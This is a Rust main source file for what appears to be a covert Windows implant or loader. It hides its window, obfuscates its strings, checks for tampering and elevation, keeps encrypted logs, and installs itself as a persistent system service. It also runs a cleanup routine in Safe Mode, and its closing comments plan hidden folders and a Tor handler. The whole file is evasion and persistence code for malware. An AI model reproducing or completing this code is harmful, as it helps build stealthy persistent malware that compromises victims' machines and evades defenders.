#![windows_subsystem = "windows"]

use lazy_static::lazy_static;
use loader_vars::constants::{ initial_log_directory, system_log_directory };
use safemode::{ runner::clean_up, utils::{ is_safe_mode, safemode_fail_safe } };
use service::{ runner::start_service, utils::{ install_initial_service, install_system_service } };
use shared::{
    constants::logs_encryption_key,
    logs::logger::Logger,
    uac::checks::{ is_elevated, is_system },
    utils::{
        anti_tampering::is_clean,
        config::load_mib_config,
        functions::{
            exit_1,
            get_current_exe,
            is_running_from_system32,
            try_spawn_program_as_system,
        },
    },
};
use windows_service_detector::is_running_as_windows_service;
use std::sync::Mutex;
use obfstr::obfstr as s;

mod network;
mod service;
mod safemode;

lazy_static! {
    pub static ref LOGGER: Mutex<Option<Logger>> = Mutex::new(None);
}

#[macro_export]
macro_rules! log_internal {
    ($level:expr, $s:expr) => {
        {
        match &*$crate::LOGGER.lock().unwrap() {
            Some(logger) => {
                logger.clone().log($level, obfstr::obfstr!($s));
                // println!("{:#?}",$s);
            }
            None => {}
        }
        }
    };

    (
        $level:expr,
        $fmt:expr,
        $($arg:tt)*
    ) => {
        {
            match &*$crate::LOGGER.lock().unwrap() {
                Some(logger) => {
                logger.clone().log($level, &format!("{}{:#?}", obfstr::obfstr!($fmt), $($arg)*));
                // println!("{}{:#?}", $fmt, $($arg)*);
            }
            None => {}
        }
        }
    };
}
#[macro_export]
macro_rules! info {
    ($s:expr) => {
        crate::log_internal!(obfstr::obfstr!("INFO"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(obfstr::obfstr!("INFO"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! warn {
    ($s:expr) => {
        $crate::log_internal!(obfstr::obfstr!("WARN"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(obfstr::obfstr!("WARN"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! err {
    ($s:expr) => {
        $crate::log_internal!(obfstr::obfstr!("ERROR"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
           $crate::log_internal!(obfstr::obfstr!("ERROR"), $fmt, $($arg)*
        )
    };
}
#[macro_export]
macro_rules! verbose {
    ($s:expr) => {
        $crate::log_internal!(obfstr::obfstr!("VERBOSE"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(obfstr::obfstr!("VERBOSE"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! tag {
    ($s:expr) => {
        $crate::log_internal!(obfstr::obfstr!("TAG"), $s)
    };
}

fn main() {
    if !is_clean() {
        exit_1();
    }
    if !is_elevated().unwrap_or(false) {
        exit_1();
    }
    let is_running_from_system_dir = is_running_from_system32();
    let log_directory = match is_running_from_system_dir {
        true => { system_log_directory() }
        false => { initial_log_directory() }
    };
    if let Ok(logger) = Logger::new(log_directory, logs_encryption_key()) {
        let mut lock = LOGGER.lock().unwrap();
        *lock = Some(logger);
    }
    info!("Init");

    let mib_config = load_mib_config(false).unwrap();

    let is_service = is_running_as_windows_service().unwrap_or_else(|error| {
        err!("is_running_as_windows_service Error, assuming true:", error);
        true
    });
    if is_safe_mode() {
        let is_system = is_system().unwrap_or_else(|error| {
            err!("is_system Error, assuming false: ", error);
            false
        });
        if is_system {
            tag!("CLEANUP");
            if let Err(error) = clean_up() {
                err!("clean_up Error: ", error);
                safemode_fail_safe();
            }
            exit_1();
        }
    }
    if is_service {
        if let Err(error) = start_service() {
            err!("start_service Error: ", error);
        }
    } else {
        if is_running_from_system_dir {
            tag!("SYS-SERVICE-INSTALL");

            if let Err(error) = install_system_service() {
                err!("install_system_service Error: ", error);
            }
        } else if !mib_config.cln_up_done {
            tag!("INITIAL-SERVICE-INSTALL");

            if let Err(error) = install_initial_service() {
                err!("install_initial_service Error: ", error);
            }
        }
        exit_1();
    }
}

// hide folders?
// add FULL anti tampering
// fix tor handler logger abomination
